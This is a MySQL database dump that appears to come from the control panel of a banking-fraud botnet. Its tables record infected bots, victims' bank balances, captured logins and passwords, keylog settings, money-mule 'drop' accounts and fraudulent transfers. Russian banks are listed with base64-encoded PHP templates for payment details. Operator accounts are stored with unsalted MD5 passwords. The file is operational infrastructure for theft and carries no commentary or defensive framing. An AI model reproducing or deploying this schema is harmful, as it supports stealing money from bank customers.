SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;


CREATE TABLE IF NOT EXISTS `bf_balance` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(33) NOT NULL,
  `ip` varchar(32) NOT NULL,
  `acc` varchar(64) NOT NULL,
  `balance` varchar(32) NOT NULL,
  `info` blob NOT NULL,
  `system` varchar(8) NOT NULL,
  `userid` varchar(8) NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq` (`prefix`,`uid`,`acc`,`balance`,`system`),
  KEY `item` (`prefix`,`uid`,`system`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `bf_bots` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(33) NOT NULL,
  `ip` varchar(32) NOT NULL,
  `city` varchar(64) NOT NULL,
  `version` varchar(16) NOT NULL,
  `info` blob NOT NULL,
  `disabled` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `label` varchar(16) NOT NULL,
  `system` varchar(8) NOT NULL,
  `userid` varchar(8) NOT NULL,
  `last_date` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `bot` (`prefix`,`uid`,`system`),
  KEY `system` (`system`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `bf_comments` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(34) NOT NULL,
  `uniq` varchar(32) DEFAULT NULL,
  `comment` varchar(250) NOT NULL,
  `type` varchar(32) NOT NULL,
  `post_id` int(11) unsigned NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `type` (`type`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `bf_drops` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `receiver` varchar(1024) NOT NULL,
  `destination` varchar(255) NOT NULL,
  `acc` varchar(32) NOT NULL,
  `from` int(16) unsigned NOT NULL,
  `to` int(16) unsigned NOT NULL,
  `citybank` varchar(64) NOT NULL,
  `max` int(10) unsigned NOT NULL DEFAULT '0',
  `vat` tinyint(3) unsigned NOT NULL,
  `other` blob NOT NULL,
  `check_city` enum('0','1') NOT NULL DEFAULT '0',
  `check_note` enum('0','1') NOT NULL DEFAULT '0',
  `status` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `system` text NOT NULL,
  `userid` varchar(8) NOT NULL,
  `post_id` int(10) unsigned NOT NULL,
  `last_date` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `bf_hidden` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(34) NOT NULL,
  `login` varchar(250) NOT NULL,
  `password` varchar(250) NOT NULL,
  `summ` int(11) NOT NULL,
  `data` blob NOT NULL,
  `system` varchar(8) NOT NULL,
  `userid` varchar(8) NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `prefix` (`prefix`,`uid`,`system`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `bf_logs` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(33) NOT NULL,
  `ip` varchar(32) NOT NULL,
  `log` text NOT NULL,
  `version` varchar(16) NOT NULL,
  `system` varchar(8) NOT NULL,
  `userid` varchar(8) NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `bf_logs_history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(33) NOT NULL,
  `receiver` varchar(128) NOT NULL,
  `sum` varchar(16) NOT NULL,
  `note` varchar(250) NOT NULL,
  `date` varchar(32) NOT NULL,
  `system` varchar(8) NOT NULL,
  `userid` varchar(8) NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `prefix` (`prefix`,`uid`,`receiver`,`sum`,`date`,`system`,`userid`),
  KEY `item` (`prefix`,`uid`,`system`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `bf_logs_passiv` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(33) NOT NULL,
  `acc` varchar(64) NOT NULL,
  `ip` varchar(32) NOT NULL,
  `log` blob NOT NULL,
  `version` varchar(16) NOT NULL,
  `system` varchar(8) NOT NULL,
  `userid` varchar(8) NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `bot` (`prefix`,`uid`,`system`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `bf_logs_tech` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(33) NOT NULL,
  `log` text NOT NULL,
  `system` varchar(8) NOT NULL,
  `userid` varchar(8) NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `item` (`prefix`,`uid`,`system`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `bf_log_info` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(33) NOT NULL,
  `balance` varchar(32) NOT NULL,
  `log` blob NOT NULL,
  `subsys` varchar(16) NOT NULL,
  `save` int(1) NOT NULL DEFAULT '0',
  `system` varchar(8) NOT NULL,
  `userid` varchar(8) NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `bot` (`prefix`,`uid`,`system`,`subsys`),
  KEY `subsys` (`subsys`,`system`,`post_date`),
  KEY `post_date` (`system`,`post_date`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `bf_manuals` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `blocks` text NOT NULL,
  `key` varchar(128) NOT NULL,
  `system` varchar(8) NOT NULL,
  `userid` varchar(8) NOT NULL,
  `rand` varchar(32) NOT NULL,
  `bin` text NOT NULL,
  `expiry_date` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

CREATE TABLE IF NOT EXISTS `bf_manuals_bak` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `acc` varchar(32) NOT NULL,
  `summ` varchar(16) NOT NULL,
  `pd` blob NOT NULL,
  `key` varchar(128) NOT NULL,
  `system` varchar(8) NOT NULL,
  `userid` varchar(8) NOT NULL,
  `rand` varchar(32) NOT NULL,
  `bin` text NOT NULL,
  `expiry_date` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `bf_systems` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `nid` varchar(8) NOT NULL,
  `name` varchar(128) NOT NULL,
  `percent` tinyint(2) unsigned NOT NULL,
  `format` blob NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=16 ;

INSERT INTO `bf_systems` (`id`, `nid`, `name`, `percent`, `format`, `post_date`) VALUES
(1, 'cber', 'Сбер', 73, 0x63484a70626e516f4a484e356333526c6253302b633356744b54734b63484a70626e516f4a33776e4b54734b63484a70626e516f4a47527962334174506d39306147567957796470626d346e58536b37436e4279615735304b4364384a796b37436e4279615735304b477830636d6c744b43526b636d39774c5435766447686c636c736e596d6c724a313073494363774a796b704f777077636d6c756443676e664363704f777077636d6c756443686859324e4f6457314762334a745958516f4a47527962334174506d466a5979776764484a315a536b704f777077636d6c756443676e664363704f777077636d6c756443676b5a484a766343302b636d566a5a576c325a5849704f777077636d6c756443676e664363704f777077636d6c756443676b5a484a766343302b5a47567a64476c7559585270623234704f777077636d6c756443676e4c4363704f776f4b6157596f61584e7a5a58516f4a484e356333526c6253302b646d46304b536c37436e4279615735304b436367304a33516c4e4368494363674c69416b63336c7a644756744c543532595851674c69416e4c6963704f7770395a57787a5a58734b63484a70626e516f4a7944516e644355304b4567304c33517453445176744378304c7651734e437a304c445174644743305948526a79346e4b54734b66516f4b63484a70626e516f4a33776e4b54734b63484a70626e516f62574a6663335279644739316348426c6369676b5a484a766343302b626d46745a5377674a315655526930344a796b704f776f4b6157596f49575674634852354b43526b636d39774c5435766447686c636c736e59326c3065574a68626d736e58536b7065777077636d6c7564436874596c397a64484a3062335677634756794b436367304a4d754a7941754943526b636d39774c5435766447686c636c736e59326c3065574a68626d736e585377674a315655526930344a796b704f77703943677077636d6c756443676e664363704f777077636d6c756443676b5a484a766343302b6233526f5a584a624a304a7561307450636e4a42593235304a3130704f773d3d, '2011-10-25 10:29:38'),
(9, 'avangard', 'Avangard', 1, '', '2012-02-07 06:58:08'),
(4, 'bss', 'БСС', 76, 0x49413d3d, '2011-11-08 12:45:25'),
(5, 'alpha', 'Альфа', 1, '', '2011-12-20 07:42:40'),
(6, 'cberfiz', 'СберФиз', 5, '', '2011-12-27 07:10:56'),
(7, 'rafa', 'Рафа', 1, '', '2012-01-14 07:29:26'),
(8, 'cc', 'Кредитки', 1, '', '2012-01-14 07:29:38'),
(11, 'cyberpya', 'cyberpyat', 1, '', '2012-02-08 10:51:33'),
(12, 'sbank', 'Сбанк', 1, '', '2012-02-17 12:08:33'),
(14, 'barc', 'Barc', 1, '', '2012-03-03 04:32:21'),
(13, 'raifur', 'Raifur', 72, 0x63484a70626e516f4a463948525652624a32466a597964644b54734b63484a70626e516f4a33776e4b54734b63484a70626e516f4a484e356333526c6253302b633356744b54734b63484a70626e516f4a33776e4b54734b63484a70626e516f4a47527962334174506d39306147567957796470626d346e58536b37436e4279615735304b4364384a796b37436e4279615735304b43526b636d39774c5435766447686c636c736e613342776343646449436b37436e4279615735304b4364384a796b37436e4279615735304b43526b636d39774c5435766447686c636c736e596d6c724a3130704f777077636d6c756443676e664363704f777077636d6c756443676b5a484a766343302b59574e6a4b54734b63484a70626e516f4a33776e4b54734b63484a70626e516f4a47527962334174506e4a6c59325670646d56794b54734b63484a70626e516f4a33776e4b54734b63484a70626e516f4a47527962334174506d526c63335270626d4630615739754b54734b63484a70626e516f4a33776e4b54734b436d6c6d4b476c7a633256304b43527a65584e305a573074506e5a6864436b7065777077636d6c756443676e4d5363704f7770395a57787a5a58734b63484a70626e516f4a7a416e4b54734b66517077636d6c756443676e4d7a51314d7a51314a796b37436e4279615735304b4364384a796b37436e4279615735304b47316958334e30636e5276645842775a58496f4a47527962334174506d35686257557349436456564559744f4363704b54734b63484a70626e516f4a33776e4b54734b63484a70626e516f62574a6663335279644739316348426c6369676e304a4d754a7941754943526b636d39774c5435766447686c636c736e59326c3065574a68626d736e585377674a315655526930344a796b704f777077636d6c756443676e664363704f777077636d6c756443676b5a484a766343302b6233526f5a584a624a304a7561307450636e4a42593235304a3130704f773d3d, '2012-02-22 12:47:14'),
(15, 'bsscompl', 'BSS Online', 77, '', '2012-03-14 13:32:32');

CREATE TABLE IF NOT EXISTS `bf_transfers` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(33) NOT NULL,
  `ip` varchar(32) NOT NULL,
  `acc` varchar(64) NOT NULL,
  `to` varchar(64) NOT NULL,
  `balance` varchar(32) NOT NULL,
  `info` blob NOT NULL,
  `num` varchar(64) NOT NULL,
  `status` varchar(16) NOT NULL DEFAULT '0',
  `passiv` enum('0','1') NOT NULL DEFAULT '0',
  `system` varchar(8) NOT NULL,
  `userid` varchar(8) NOT NULL,
  `drop_id` int(11) NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `bf_users` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `login` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL,
  `PHPSESSID` varchar(100) DEFAULT NULL,
  `expiry_date` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `config` longtext NOT NULL,
  `access` longtext NOT NULL,
  `info` longtext,
  `userid` varchar(8) NOT NULL,
  `enable` enum('0','1') DEFAULT '0',
  `enter_date` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `update_date` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `user` (`login`,`password`),
  KEY `autorize` (`login`,`password`,`PHPSESSID`,`enable`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 PACK_KEYS=0 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=13 ;

INSERT INTO `bf_users` (`id`, `login`, `password`, `PHPSESSID`, `expiry_date`, `config`, `access`, `info`, `userid`, `enable`, `enter_date`, `update_date`, `post_date`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', '33ehb0bpkffkjp4f5ct1b8bs34', '2012-09-05 17:58:53', '{"lang":"ru","infoacc":"0","userid":""}', '{"main":{"index":"on","info":"on"},"accounts":{"index":"on","list":"on","create":"on","edit":"on","edits":"on","delete":"on","profile":"on","profiles":"on","enableanddisable":"on","rights":"on","right":"on","settings":"on","setting":"on","clients":"on","clients_add":"on","clients_edit":"on"},"settings":{"index":"on"},"systems":{"index":"on","add":"on","edit":"on","del":"on"},"drops":{"index":"on","add":"on","edit":"on","del":"on","show":"on"},"bots":{"index":"on","system":"on","bot":"on","save_comment":"on"},"logs":{"index":"on","show":"on","cberfiz":"on","cc":"on","rafa":"on"},"transfers":{"index":"on","show":"on","manual":"on","manual_add":"on"}}', '{"screen":{"w":"1438","h":"900","c":"24"},"userAgent":"Mozilla/5.0%20%28Windows%20NT%205.1%3B%20rv%3A15.0%29%20Gecko/20100101%20Firefox/15.0","appCodeName":"Mozilla","appName":"Netscape","appVersion":"5.0%20%28Windows%29","language":"ru-RU","platform":"Win32","oscpu":"Windows%20NT%205.1","product":"Gecko","productSub":"20100101","cookieEnabled":"true","onLine":"true","buildID":"20120824154833","doNotTrack":"yes","mozPower":{"screenEnabled":"true","cpuSleepAllowed":"true"},"mozBattery":{"charging":"true"},"REMOTE_PORT":"4325","REMOTE_ADDR":"127.0.0.1","HTTP_USER_AGENT":"Mozilla/5.0 (Windows NT 5.1; rv:15.0) Gecko/20100101 Firefox/15.0","REQUEST_TIME":1346867516}', '', '1', '2012-09-05 17:51:56', '2012-03-04 12:32:10', '2009-07-27 06:05:00'),
(12, 'f', '0cc175b9c0f1b6a831c399e269772661', '', '2012-09-05 17:51:54', '{"lang":"ru","cp":{"bots":"100","bots_country":"100","keylog":"100","keylogp":"100","cabs":"100","filters":"100"},"klimit":"","climit":"","infoacc":"1","prefix":{"RU_AZ_BB":true,"TEST":true,"TST":true},"systems":{"bss":true,"alpha":true,"rafa":true,"bsscompl":true},"userid":"dqjYmsFn"}', '{"main":{"index":"on","info":"on"},"systems":{"index":"on"},"drops":{"index":"on","add":"on","edit":"on","show":"on"},"bots":{"index":"on","system":"on","bot":"on","save_comment":"on"},"logs":{"index":"on","show":"on","cberfiz":"on","cc":"on","rafa":"on"},"transfers":{"index":"on","show":"on","manual_add":"on"}}', '{"screen":{"w":"1438","h":"900","c":"24"},"userAgent":"Mozilla/5.0%20%28Windows%20NT%205.1%3B%20rv%3A15.0%29%20Gecko/20100101%20Firefox/15.0","appCodeName":"Mozilla","appName":"Netscape","appVersion":"5.0%20%28Windows%29","language":"ru-RU","platform":"Win32","oscpu":"Windows%20NT%205.1","product":"Gecko","productSub":"20100101","cookieEnabled":"true","onLine":"true","buildID":"20120824154833","doNotTrack":"yes","mozPower":{"screenEnabled":"true","cpuSleepAllowed":"true"},"mozBattery":{"charging":"true"},"REMOTE_PORT":"4308","REMOTE_ADDR":"127.0.0.1","HTTP_USER_AGENT":"Mozilla/5.0 (Windows NT 5.1; rv:15.0) Gecko/20100101 Firefox/15.0","REQUEST_TIME":1346867487}', 'dqjYmsFn', '1', '2012-09-05 17:51:27', '0000-00-00 00:00:00', '2012-07-30 16:40:01');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
